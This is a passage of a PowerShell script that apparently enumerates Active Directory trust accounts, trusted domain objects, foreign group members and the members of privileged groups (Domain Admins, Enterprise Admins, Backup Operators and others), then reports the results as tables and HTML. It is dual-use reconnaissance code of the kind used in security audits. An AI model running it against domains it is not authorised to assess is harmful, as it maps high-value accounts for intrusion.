				"SAM Account Type" = $TrustAccount.samaccounttype
			}
		}
		
		if($TempTrustAccounts){
			$TempTrustAccounts | ft -AutoSize -Wrap
			$HTMLTrustAccounts = $TempTrustAccounts | ConvertTo-Html -Fragment -PreContent "<h2>Trust Accounts</h2>"
		}
		
    }
	
    else{
		$TempTrustAccounts = foreach($AllDomain in $AllDomains){
			$TrustAccounts = Get-DomainObject -Domain $AllDomain -LDAPFilter "(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2048)"
			
			foreach($TrustAccount in $TrustAccounts){
				
				[PSCustomObject]@{
					Domain = $AllDomain
					"SAM Account Name" = $TrustAccount.samaccountname
					"Object SID" = $TrustAccount.objectsid
					"Object GUID" = $TrustAccount.objectguid
					"SAM Account Type" = $TrustAccount.samaccounttype
				}
			}
		}
		
		if($TempTrustAccounts){
			$TempTrustAccounts | ft -AutoSize -Wrap
			$HTMLTrustAccounts = $TempTrustAccounts | ConvertTo-Html -Fragment -PreContent "<h2>Trust Accounts</h2>"
		}
    }
	
	#############################################
    ####### Trusted Domain Object GUIDs #########
	#############################################

    Write-Host ""
    Write-Host "Trusted Domain Object GUIDs:" -ForegroundColor Cyan
    if($Domain -AND $Server) {
		$TDOTargetNames = Get-DomainTrust -Domain $Domain -Server $Server | Where-Object { $_.TrustDirection -eq 'Outbound' } | Select-Object -ExpandProperty TargetName
		$TDOTrustDirection = "Outbound"
		$TDOTargetNames = ($TDOTargetNames | Out-String) -split "`n"
		$TDOTargetNames = $TDOTargetNames.Trim()
		$TDOTargetNames = $TDOTargetNames | Where-Object { $_ -ne "" }
		
		$TDOSourceDomainName = "DC=" + $Domain.Split(".")
		$TDOSourceDomainName = $TDOSourceDomainName -replace " ", ",DC="
		$TempTrustedDomainObjectGUIDs = foreach($TDOTargetName in $TDOTargetNames){
			$TrustedDomainObjectGUIDs = Get-DomainObject -Domain $Domain -Server $Server -Identity "CN=$TDOTargetName,CN=System,$TDOSourceDomainName"
			
			foreach ($TrustedDomainObjectGUID in $TrustedDomainObjectGUIDs) {
				[PSCustomObject]@{
					"Source Name" = $Domain
					"Target Name" = $TDOTargetName
					"Trust Direction" = $TDOTrustDirection
					"Object GUID" = $TrustedDomainObjectGUID.objectGuid
				}
			}
		}
		if($TempTrustedDomainObjectGUIDs){
			$TempTrustedDomainObjectGUIDs | ft -AutoSize -Wrap
			$HTMLTrustedDomainObjectGUIDs = $TempTrustedDomainObjectGUIDs | ConvertTo-Html -Fragment -PreContent "<h2>Trusted Domain Object GUIDs</h2>"
		}
    }
	
    else{
		$TDOTargetNames = foreach($AllDomain in $AllDomains){Get-DomainTrust -Domain $AllDomain | Where-Object { $_.TrustDirection -eq 'Outbound' } | Select-Object -ExpandProperty TargetName}
		$TDOTrustDirection = "Outbound"
		$TDOTargetNames = ($TDOTargetNames | Out-String) -split "`n"
		$TDOTargetNames = $TDOTargetNames.Trim()
		$TDOTargetNames = $TDOTargetNames | Where-Object { $_ -ne "" }
		
		$TempTrustedDomainObjectGUIDs = foreach($AllDomain in $AllDomains){
			$TDOSourceDomainName = "DC=" + $AllDomain.Split(".")
			$TDOSourceDomainName = $TDOSourceDomainName -replace " ", ",DC="
			foreach($TDOTargetName in $TDOTargetNames){
				$TrustedDomainObjectGUIDs = Get-DomainObject -Domain $AllDomain -Identity "CN=$TDOTargetName,CN=System,$TDOSourceDomainName"
				
				foreach ($TrustedDomainObjectGUID in $TrustedDomainObjectGUIDs) {
					[PSCustomObject]@{
						"Source Name" = $AllDomain
						"Target Name" = $TDOTargetName
						"Trust Direction" = $TDOTrustDirection
						"Object GUID" = $TrustedDomainObjectGUID.objectGuid
					}
				}
			}
		}
		if($TempTrustedDomainObjectGUIDs){
			$TempTrustedDomainObjectGUIDs | ft -AutoSize -Wrap
			$HTMLTrustedDomainObjectGUIDs = $TempTrustedDomainObjectGUIDs | ConvertTo-Html -Fragment -PreContent "<h2>Trusted Domain Object GUIDs</h2>"
		}
    }
	
	#############################################
    ################ Outsiders ##################
	#############################################
        
    Write-Host ""
	Write-Host "Groups that contain users outside of its domain and return its members:" -ForegroundColor Cyan
	if($Domain -AND $Server) {
		$ForeignGroupMembers = Get-DomainForeignGroupMember -Domain $Domain -Server $Server

		$TempForeignGroupMembers = foreach ($ForeignGroupMember in $ForeignGroupMembers) {
			
			$convertedMemberName = $null
			$PlaceHolderDomain = $null
			
			foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
				try {
					$convertedMemberName = ConvertFrom-SID $ForeignGroupMember.MemberName -Domain $PlaceHolderDomain
					if ($null -ne $convertedMemberName) { break }
				}
				catch {
					continue
				}
			}

   			if($convertedMemberName){}
      			else {
	 			$PlaceHolderDomain = $null
     				$ForeignGroupMemberAccount = $null
	 			$DomainNameExtract = $null
     				$matchedDomain = $null
     				$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $ForeignGroupMember.MemberName
    				$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
				#$ExtractDomainSID = ($ForeignGroupMember.MemberName -split '-', 8)[0..6] -join '-'
    				$DomainNameExtract = $convertedMemberName.Split('\')[0]
				
				foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
				    if ($DomainNameExtract -and $PlaceHolderDomain -like "*$DomainNameExtract*") {
				        $matchedDomain = $PlaceHolderDomain
				        break
				    }
				}

    				$PlaceHolderDomain = $matchedDomain
     			}
			
			[PSCustomObject]@{
				"Group Domain" = $ForeignGroupMember.GroupDomain
				"Group Name" = $ForeignGroupMember.GroupName
				#"Group Distinguished Name" = $ForeignGroupMember.GroupDistinguishedName
				"Member Domain" = $PlaceHolderDomain
				"Member or GroupName" = $convertedMemberName
				"Member or GroupName SID" = $ForeignGroupMember.MemberName
				"Group Members" = if($convertedMemberName) {(Get-DomainGroupMember -Domain $PlaceHolderDomain -Recurse -Identity $convertedMemberName).MemberName -join ' - '} else {""}
			}
		}
	}

	else {
		$TempForeignGroupMembers = foreach ($AllDomain in $AllDomains) {
			
			$ForeignGroupMembers = Get-DomainForeignGroupMember -Domain $AllDomain

			foreach ($ForeignGroupMember in $ForeignGroupMembers) {
				$convertedMemberName = $null
				$PlaceHolderDomain = $null
				foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
					try {
						$convertedMemberName = ConvertFrom-SID $ForeignGroupMember.MemberName -Domain $PlaceHolderDomain
						if ($null -ne $convertedMemberName) { break }
					}
					catch {
						continue
					}
				}

    				if($convertedMemberName){}
				else {
		 			$PlaceHolderDomain = $null
	     				$ForeignGroupMemberAccount = $null
		 			$DomainNameExtract = $null
	     				$matchedDomain = $null
	     				$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $ForeignGroupMember.MemberName
	    				$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
					#$ExtractDomainSID = ($ForeignGroupMember.MemberName -split '-', 8)[0..6] -join '-'
	    				$DomainNameExtract = $convertedMemberName.Split('\')[0]
					
					foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
					    if ($DomainNameExtract -and $PlaceHolderDomain -like "*$DomainNameExtract*") {
					        $matchedDomain = $PlaceHolderDomain
					        break
					    }
					}
	
	    				$PlaceHolderDomain = $matchedDomain
	     			}
				
				[PSCustomObject]@{
					"Group Domain" = $ForeignGroupMember.GroupDomain
					"Group Name" = $ForeignGroupMember.GroupName
					#"Group Distinguished Name" = $ForeignGroupMember.GroupDistinguishedName
					"Member Domain" = $PlaceHolderDomain
					"Member or GroupName" = $convertedMemberName
					"Member or GroupName SID" = $ForeignGroupMember.MemberName
					"Group Members" = if($convertedMemberName) {(Get-DomainGroupMember -Domain $PlaceHolderDomain -Recurse -Identity $convertedMemberName).MemberName -join ' - '} else {""}
				}
			}
		}
	}

 	if ($TempForeignGroupMembers) {
			$TempForeignGroupMembers | Format-Table -AutoSize -Wrap
			$HTMLGetDomainForeignGroupMember = $TempForeignGroupMembers | ConvertTo-Html -Fragment -PreContent "<h2>Groups that contain users outside of its domain and return its members</h2>"
		}

	
	####################################################
    ########### Built-In Administrators ################
	####################################################
	
	Write-Host ""
    Write-Host "Built-In Administrators:" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$BuiltInAdministrators = Get-DomainGroupMember -Domain $Domain -Server $Server -Identity "Administrators" -Recurse
		$TempBuiltInAdministrators = foreach($BuiltInAdministrator in $BuiltInAdministrators){

  			$convertedMemberName = $null
			$PlaceHolderDomain = $null
			
			foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
				try {
					$convertedMemberName = ConvertFrom-SID $BuiltInAdministrator.MemberSID -Domain $PlaceHolderDomain
					if ($null -ne $convertedMemberName) { break }
				}
				catch {
					continue
				}
			}

   			if($convertedMemberName){}
			else {
				$ForeignGroupMemberAccount = $null
				$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $BuiltInAdministrator.MemberSID
				$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
			}
			
			$domainObject = Get-DomainObject -Identity $BuiltInAdministrator.MemberName -Domain $Domain -Server $Server -Properties lastlogontimestamp
			$memberName = if ($BuiltInAdministrator.MemberName) { $BuiltInAdministrator.MemberName } else { $convertedMemberName }
			$isEnabled = if ($BuiltInAdministrator.useraccountcontrol -band 2) { "False" } else { "True" }
			$lastLogon = $domainObject.lastlogontimestamp
   			$isActive = if ($lastLogon -ge $inactiveThreshold) { "True" } elseif ($lastLogon -eq $null) { "" } else { "False" }

			[PSCustomObject]@{
				"Member Name" = $memberName
				"Enabled" = $isEnabled
				"Active" = $isActive
				"Last Logon" = $lastLogon
				"Member SID" = $BuiltInAdministrator.MemberSID
				"Group Domain" = $BuiltInAdministrator.GroupDomain
				#"Description" = $domainObject.description
			}

		}
	}
 
	else {
		$TempBuiltInAdministrators = foreach ($AllDomain in $AllDomains) {
			$BuiltInAdministrators = Get-DomainGroupMember -Domain $AllDomain -Identity "Administrators" -Recurse
			foreach($BuiltInAdministrator in $BuiltInAdministrators){

   				$convertedMemberName = $null
				$PlaceHolderDomain = $null
				
				foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
					try {
						$convertedMemberName = ConvertFrom-SID $BuiltInAdministrator.MemberSID -Domain $PlaceHolderDomain
						if ($null -ne $convertedMemberName) { break }
					}
					catch {
						continue
					}
				}

    				if($convertedMemberName){}
				else {
					$ForeignGroupMemberAccount = $null
					$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $BuiltInAdministrator.MemberSID
					$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
				}
				
				$domainObject = Get-DomainObject -Identity $BuiltInAdministrator.MemberName -Domain $AllDomain -Properties lastlogontimestamp
				$memberName = if ($BuiltInAdministrator.MemberName) { $BuiltInAdministrator.MemberName } else { $convertedMemberName }
				$isEnabled = if ($BuiltInAdministrator.useraccountcontrol -band 2) { "False" } else { "True" }
				$lastLogon = $domainObject.lastlogontimestamp

				$isActive = if ($lastLogon -ge $inactiveThreshold) { "True" } elseif ($lastLogon -eq $null) { "" } else { "False" }

				[PSCustomObject]@{
					"Member Name" = $memberName
					"Enabled" = $isEnabled
					"Active" = $isActive
					"Last Logon" = $lastLogon
					"Member SID" = $BuiltInAdministrator.MemberSID
					"Group Domain" = $BuiltInAdministrator.GroupDomain
					#"Description" = $domainObject.description
				}

			}
		}
	}

 	if ($TempBuiltInAdministrators) {
		$TempBuiltInAdministrators | Sort-Object -Unique "Group Domain","Member Name","Member SID" | ft -Autosize -Wrap
		$HTMLBuiltInAdministrators = $TempBuiltInAdministrators | Sort-Object -Unique "Group Domain","Member Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2>Built-In Administrators</h2>"
	}
	
	######################################################
    ########### Enterprise Administrators ################
	######################################################
	
	Write-Host ""
    Write-Host "Enterprise Administrators:" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$EnterpriseAdmins = Get-DomainGroupMember -Domain $Domain -Server $Server -Identity "Enterprise Admins" -Recurse
		$TempEnterpriseAdmins = foreach($EnterpriseAdmin in $EnterpriseAdmins){

  			$convertedMemberName = $null
			$PlaceHolderDomain = $null
			
			foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
				try {
					$convertedMemberName = ConvertFrom-SID $EnterpriseAdmin.MemberSID -Domain $PlaceHolderDomain
					if ($null -ne $convertedMemberName) { break }
				}
				catch {
					continue
				}
			}

   			if($convertedMemberName){}
			else {
				$ForeignGroupMemberAccount = $null
				$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $EnterpriseAdmin.MemberSID
				$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
			}
			
			$domainObject = Get-DomainObject -Identity $EnterpriseAdmin.MemberName -Domain $Domain -Server $Server -Properties lastlogontimestamp
			$memberName = if ($EnterpriseAdmin.MemberName) { $EnterpriseAdmin.MemberName } else { $convertedMemberName }
			$isEnabled = if ($EnterpriseAdmin.useraccountcontrol -band 2) { "False" } else { "True" }
			$isActive = if ($domainObject.lastlogontimestamp -ge $inactiveThreshold) { "True" } elseif ($domainObject.lastlogontimestamp -eq $null) { "" } else { "False" }

			[PSCustomObject]@{
				"Member Name" = $memberName
				"Enabled" = $isEnabled
				"Active" = $isActive
				"Last Logon" = $domainObject.lastlogontimestamp
				"Member SID" = $EnterpriseAdmin.MemberSID
				"Group Domain" = $EnterpriseAdmin.GroupDomain
				#"Description" = $domainObject.description
			}

		}
	}
 
	else {
		$TempEnterpriseAdmins = foreach ($AllDomain in $AllDomains) {
			$EnterpriseAdmins = Get-DomainGroupMember -Domain $AllDomain -Identity "Enterprise Admins" -Recurse
			foreach($EnterpriseAdmin in $EnterpriseAdmins){

   				$convertedMemberName = $null
				$PlaceHolderDomain = $null
				
				foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
					try {
						$convertedMemberName = ConvertFrom-SID $EnterpriseAdmin.MemberSID -Domain $PlaceHolderDomain
						if ($null -ne $convertedMemberName) { break }
					}
					catch {
						continue
					}
				}

    				if($convertedMemberName){}
				else {
					$ForeignGroupMemberAccount = $null
					$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $EnterpriseAdmin.MemberSID
					$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
				}
				
				$domainObject = Get-DomainObject -Identity $EnterpriseAdmin.MemberName -Domain $AllDomain -Properties lastlogontimestamp
				$memberName = if ($EnterpriseAdmin.MemberName) { $EnterpriseAdmin.MemberName } else { $convertedMemberName }
				$isEnabled = if ($EnterpriseAdmin.useraccountcontrol -band 2) { "False" } else { "True" }
				$isActive = if ($domainObject.lastlogontimestamp -ge $inactiveThreshold) { "True" } elseif ($domainObject.lastlogontimestamp -eq $null) { "" } else { "False" }

				[PSCustomObject]@{
					"Member Name" = $memberName
					"Enabled" = $isEnabled
					"Active" = $isActive
					"Last Logon" = $domainObject.lastlogontimestamp
					"Member SID" = $EnterpriseAdmin.MemberSID
					"Group Domain" = $EnterpriseAdmin.GroupDomain
					#"Description" = $domainObject.description
				}
			}
		}
	}

 	if ($TempEnterpriseAdmins) {
			$TempEnterpriseAdmins | Sort-Object -Unique "Group Domain","Member Name","Member SID" | ft -Autosize -Wrap
			$HTMLEnterpriseAdmins = $TempEnterpriseAdmins | Sort-Object -Unique "Group Domain","Member Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2>Enterprise Administrators</h2>"
		}
	
	##################################################
    ########### Domain Administrators ################
	##################################################
	
	Write-Host ""
    Write-Host "Domain Administrators:" -ForegroundColor Cyan
    if ($Domain -and $Server) {
		$DomainAdmins = Get-DomainGroupMember -Domain $Domain -Server $Server -Identity "Domain Admins" -Recurse
		$TempDomainAdmins = foreach ($DomainAdmin in $DomainAdmins) {

  			$convertedMemberName = $null
			$PlaceHolderDomain = $null
			
			foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
				try {
					$convertedMemberName = ConvertFrom-SID $DomainAdmin.MemberSID -Domain $PlaceHolderDomain
					if ($null -ne $convertedMemberName) { break }
				}
				catch {
					continue
				}
			}

   			if($convertedMemberName){}
			else {
				$ForeignGroupMemberAccount = $null
				$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $DomainAdmin.MemberSID
				$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
			}
			
			$domainObject = Get-DomainObject -Identity $DomainAdmin.MemberName -Domain $Domain -Server $Server -Properties lastlogontimestamp
			$lastLogonTimestamp = $domainObject.lastlogontimestamp
			$isActive = if ($lastLogonTimestamp -ge $inactiveThreshold) { "True" } elseif ($lastLogonTimestamp -eq $null) { "" } else { "False" }

			[PSCustomObject]@{
				"Member Name" = if ($DomainAdmin.MemberName) { $DomainAdmin.MemberName } else { $convertedMemberName }
				"Enabled" = if ($DomainAdmin.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = $isActive
				"Last Logon" = $lastLogonTimestamp
				"Member SID" = $DomainAdmin.MemberSID
				"Group Domain" = $DomainAdmin.GroupDomain
				#"Description" = $domainObject.description
			}

		}
	}
 
	else {
		$TempDomainAdmins = foreach ($AllDomain in $AllDomains) {
			$DomainAdmins = Get-DomainGroupMember -Domain $AllDomain -Identity "Domain Admins" -Recurse
			foreach ($DomainAdmin in $DomainAdmins) {

   				$convertedMemberName = $null
				$PlaceHolderDomain = $null
				
				foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
					try {
						$convertedMemberName = ConvertFrom-SID $DomainAdmin.MemberSID -Domain $PlaceHolderDomain
						if ($null -ne $convertedMemberName) { break }
					}
					catch {
						continue
					}
				}

    				if($convertedMemberName){}
				else {
					$ForeignGroupMemberAccount = $null
					$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $DomainAdmin.MemberSID
					$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
				}
				
				$domainObject = Get-DomainObject -Identity $DomainAdmin.MemberName -Domain $AllDomain -Properties lastlogontimestamp
				$lastLogonTimestamp = $domainObject.lastlogontimestamp
				$isActive = if ($lastLogonTimestamp -ge $inactiveThreshold) { "True" } elseif ($lastLogonTimestamp -eq $null) { "" } else { "False" }

				[PSCustomObject]@{
					"Member Name" = if ($DomainAdmin.MemberName) { $DomainAdmin.MemberName } else { $convertedMemberName }
					"Enabled" = if ($DomainAdmin.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = $isActive
					"Last Logon" = $lastLogonTimestamp
					"Member SID" = $DomainAdmin.MemberSID
					"Group Domain" = $DomainAdmin.GroupDomain
					#"Description" = $domainObject.description
				}
			}
		}
	}

 	if ($TempDomainAdmins) {
			$TempDomainAdmins | Sort-Object -Unique "Group Domain","Member Name","Member SID" | ft -Autosize -Wrap
			$HTMLDomainAdmins = $TempDomainAdmins | Sort-Object -Unique "Group Domain","Member Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2>Domain Administrators</h2>"
		}

 	#################################################### 
		########### Security Groups ################
		####################################################

 	if($SecurityGroups -OR $AllEnum){
		
		#################################################### 
		########### Account Operators ################
		####################################################

		Write-Host ""
		Write-Host "Account Operators:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$AccountOperators = Get-DomainGroupMember -Domain $Domain -Server $Server -Identity "Account Operators" -Recurse
			$TempAccountOperators = foreach($AccountOperator in $AccountOperators){

   				$convertedMemberName = $null
				$PlaceHolderDomain = $null
				
				foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
					try {
						$convertedMemberName = ConvertFrom-SID $AccountOperator.MemberSID -Domain $PlaceHolderDomain
						if ($null -ne $convertedMemberName) { break }
					}
					catch {
						continue
					}
				}

    				if($convertedMemberName){}
				else {
					$ForeignGroupMemberAccount = $null
					$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $AccountOperator.MemberSID
					$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
				}
				
				$domainObject = Get-DomainObject -Identity $AccountOperator.MemberName -Domain $Domain -Server $Server -Properties lastlogontimestamp
				$memberName = if ($AccountOperator.MemberName) { $AccountOperator.MemberName } else { $convertedMemberName }
				$isEnabled = if ($AccountOperator.useraccountcontrol -band 2) { "False" } else { "True" }
				$lastLogon = $domainObject.lastlogontimestamp
				$isActive = if ($lastLogon -ge $inactiveThreshold) { "True" } elseif ($lastLogon -eq $null) { "" } else { "False" }

				[PSCustomObject]@{
					"Member Name" = $memberName
					"Enabled" = $isEnabled
					"Active" = $isActive
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $AccountOperator.MemberName.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $AccountOperator.MemberName.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $AccountOperator.MemberName.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($domainObject.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($domainObject.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($domainObject.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $lastLogon
					"Member SID" = $AccountOperator.MemberSID
					"Group Domain" = $AccountOperator.GroupDomain
					#"Description" = $domainObject.description
				}
			}
		}
		else {
			$TempAccountOperators = foreach ($AllDomain in $AllDomains) {
				$AccountOperators = Get-DomainGroupMember -Domain $AllDomain -Identity "Account Operators" -Recurse
				foreach($AccountOperator in $AccountOperators){

    					$convertedMemberName = $null
					$PlaceHolderDomain = $null
					
					foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
						try {
							$convertedMemberName = ConvertFrom-SID $AccountOperator.MemberSID -Domain $PlaceHolderDomain
							if ($null -ne $convertedMemberName) { break }
						}
						catch {
							continue
						}
					}

     					if($convertedMemberName){}
					else {
						$ForeignGroupMemberAccount = $null
						$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $AccountOperator.MemberSID
						$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
					}
					
					$domainObject = Get-DomainObject -Identity $AccountOperator.MemberName -Domain $AllDomain -Properties lastlogontimestamp
					$memberName = if ($AccountOperator.MemberName) { $AccountOperator.MemberName } else { $convertedMemberName }
					$isEnabled = if ($AccountOperator.useraccountcontrol -band 2) { "False" } else { "True" }
					$lastLogon = $domainObject.lastlogontimestamp
					$isActive = if ($lastLogon -ge $inactiveThreshold) { "True" } elseif ($lastLogon -eq $null) { "" } else { "False" }

					[PSCustomObject]@{
						"Member Name" = $memberName
						"Enabled" = $isEnabled
						"Active" = $isActive
      						"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $AccountOperator.MemberName.Contains($_) }) { "YES" } else { "NO" }
						"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $AccountOperator.MemberName.Contains($_) }) { "YES" } else { "NO" }
						"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $AccountOperator.MemberName.Contains($_) }) { "YES" } else { "NO" }
						#"Adm" = if ($domainObject.memberof -match 'Administrators') { "YES" } else { "NO" }
						#"DA" = if ($domainObject.memberof -match 'Domain Admins') { "YES" } else { "NO" }
						#"EA" = if ($domainObject.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
						"Last Logon" = $lastLogon
						"Member SID" = $AccountOperator.MemberSID
						"Group Domain" = $AccountOperator.GroupDomain
						#"Description" = $domainObject.description
					}
				}
			}
		}

		if ($TempAccountOperators) {
			$TempAccountOperators | Sort-Object -Unique "Group Domain","Member Name","Member SID" | Format-Table -Autosize -Wrap
			$HTMLAccountOperators = $TempAccountOperators | Sort-Object -Unique "Group Domain","Member Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2>Account Operators</h2>"
		}
		
		#################################################### 
		########### Backup Operators ################
		####################################################
		
		Write-Host ""
		Write-Host "Backup Operators:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$BackupOperators = Get-DomainGroupMember -Domain $Domain -Server $Server -Identity "Backup Operators" -Recurse
			$TempBackupOperators = foreach($BackupOperator in $BackupOperators){

   				$convertedMemberName = $null
				$PlaceHolderDomain = $null
				
				foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
					try {
						$convertedMemberName = ConvertFrom-SID $BackupOperator.MemberSID -Domain $PlaceHolderDomain
						if ($null -ne $convertedMemberName) { break }
					}
					catch {
						continue
					}
				}

    				if($convertedMemberName){}
				else {
					$ForeignGroupMemberAccount = $null
					$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $BackupOperator.MemberSID
					$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
				}
				
				$domainObject = Get-DomainObject -Identity $BackupOperator.MemberName -Domain $Domain -Server $Server -Properties lastlogontimestamp
				$memberName = if ($BackupOperator.MemberName) { $BackupOperator.MemberName } else { $convertedMemberName }
				$isEnabled = if ($BackupOperator.useraccountcontrol -band 2) { "False" } else { "True" }
				$lastLogon = $domainObject.lastlogontimestamp
				$isActive = if ($lastLogon -ge $inactiveThreshold) { "True" } elseif ($lastLogon -eq $null) { "" } else { "False" }

				[PSCustomObject]@{
					"Member Name" = $memberName
					"Enabled" = $isEnabled
					"Active" = $isActive
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $BackupOperator.MemberName.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $BackupOperator.MemberName.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $BackupOperator.MemberName.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($domainObject.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($domainObject.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($domainObject.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $lastLogon
					"Member SID" = $BackupOperator.MemberSID
					"Group Domain" = $BackupOperator.GroupDomain
					#"Description" = $domainObject.description
				}
			}
		}
		else {
			$TempBackupOperators = foreach ($AllDomain in $AllDomains) {
				$BackupOperators = Get-DomainGroupMember -Domain $AllDomain -Identity "Backup Operators" -Recurse
				foreach($BackupOperator in $BackupOperators){

    					$convertedMemberName = $null
					$PlaceHolderDomain = $null
					
					foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
						try {
							$convertedMemberName = ConvertFrom-SID $BackupOperator.MemberSID -Domain $PlaceHolderDomain
							if ($null -ne $convertedMemberName) { break }
						}
						catch {
							continue
						}
					}

     					if($convertedMemberName){}
					else {
						$ForeignGroupMemberAccount = $null
						$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $BackupOperator.MemberSID
						$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
					}
					
					$domainObject = Get-DomainObject -Identity $BackupOperator.MemberName -Domain $AllDomain -Properties lastlogontimestamp
					$memberName = if ($BackupOperator.MemberName) { $BackupOperator.MemberName } else { $convertedMemberName }
					$isEnabled = if ($BackupOperator.useraccountcontrol -band 2) { "False" } else { "True" }
					$lastLogon = $domainObject.lastlogontimestamp

					$isActive = if ($lastLogon -ge $inactiveThreshold) { "True" } elseif ($lastLogon -eq $null) { "" } else { "False" }

					[PSCustomObject]@{
						"Member Name" = $memberName
						"Enabled" = $isEnabled
						"Active" = $isActive
      						"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $BackupOperator.MemberName.Contains($_) }) { "YES" } else { "NO" }
						"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $BackupOperator.MemberName.Contains($_) }) { "YES" } else { "NO" }
						"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $BackupOperator.MemberName.Contains($_) }) { "YES" } else { "NO" }
						#"Adm" = if ($domainObject.memberof -match 'Administrators') { "YES" } else { "NO" }
						#"DA" = if ($domainObject.memberof -match 'Domain Admins') { "YES" } else { "NO" }
						#"EA" = if ($domainObject.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
						"Last Logon" = $lastLogon
						"Member SID" = $BackupOperator.MemberSID
						"Group Domain" = $BackupOperator.GroupDomain
						#"Description" = $domainObject.description
					}
				}
			}
		}

		if ($TempBackupOperators) {
			$TempBackupOperators | Sort-Object -Unique "Group Domain","Member Name","Member SID" | Format-Table -Autosize -Wrap
			$HTMLBackupOperators = $TempBackupOperators | Sort-Object -Unique "Group Domain","Member Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2>Backup Operators</h2>"
		}
		
		#################################################### 
		########### Cert Publishers ################
		####################################################
		
		Write-Host ""
		Write-Host "Cert Publishers:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$CertPublishers = Get-DomainGroupMember -Domain $Domain -Server $Server -Identity "Cert Publishers" -Recurse
			$TempCertPublishersGroup = foreach($CertPublisher in $CertPublishers){

   				$convertedMemberName = $null
				$PlaceHolderDomain = $null
				
				foreach ($PlaceHolderDomain in $PlaceHolderDomains) {
					try {
						$convertedMemberName = ConvertFrom-SID $CertPublisher.MemberSID -Domain $PlaceHolderDomain
						if ($null -ne $convertedMemberName) { break }
					}
					catch {
						continue
					}
				}

    				if($convertedMemberName){}
				else {
					$ForeignGroupMemberAccount = $null
					$ForeignGroupMemberAccount = New-Object System.Security.Principal.SecurityIdentifier $CertPublisher.MemberSID
					$convertedMemberName = $ForeignGroupMemberAccount.Translate([System.Security.Principal.NTAccount]).Value
				}
				
